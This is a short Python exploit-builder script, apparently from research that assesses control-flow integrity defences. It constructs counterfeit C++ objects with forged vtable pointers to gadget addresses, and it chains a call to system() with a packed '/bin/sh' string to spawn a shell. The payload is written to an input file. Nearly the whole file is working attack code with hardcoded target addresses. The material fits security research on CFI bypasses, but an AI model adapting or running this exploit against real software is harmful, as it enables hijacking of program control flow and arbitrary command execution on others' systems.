import sys
sys.path.append("../builder")

from builder import *
# /home/richard/Code/CFI-Assessor-SourceCode/source_code/scripts/clang_wrapper.py
def exp1(baseMod, baseBuff, maxOffset):
    r = Relocator(0, baseMod)

    VINDEX_MAIN = 0
    ADDR_PTR_ML_GADGET = 0x7ffff7ff5da8
    ADDR_CALL_GADGET = 0x7ffff7ff5d58
    ADDR_SYSTEM = 0x7ffff784e390
    STR_BINSH = 0x0068732f6e69622f

    initObj = Obj64(fixedOffset=0)
    initObj.setVptr(ADDR_PTR_ML_GADGET, 0)
    initObj.mem.addQword(offset=0x8, qword=100)
    initObj.mem.addUnresolvedPointer(0x10, targetLabel=ArrayBuilder.LABEL_ARRAY)
    initObj.mem.invalidate(0x18, size=4)

    b = ArrayBuilder(Arch.X64, baseBuff, initObj)

    call_system = Obj64()
    call_system.setVptr(ADDR_CALL_GADGET, VINDEX_MAIN)
    call_system.mem.addQword(offset=0x8, qword=ADDR_SYSTEM)
    call_system.mem.addQword(offset=0x10, qword=STR_BINSH)
    b.addObj(call_system)

    return b.finalize(maxOffset)




if __name__ == '__main__':
    baseMod = 0x7ffff7ff2000
    baseBuff = 0xA0000000
    a = exp1(baseMod, baseBuff, 4096)

    print a.encode("hex")
    f = open("input", "wb")
    f.write(a)
    f.close()
    print "[i] Wrote %d bytes." % len(a)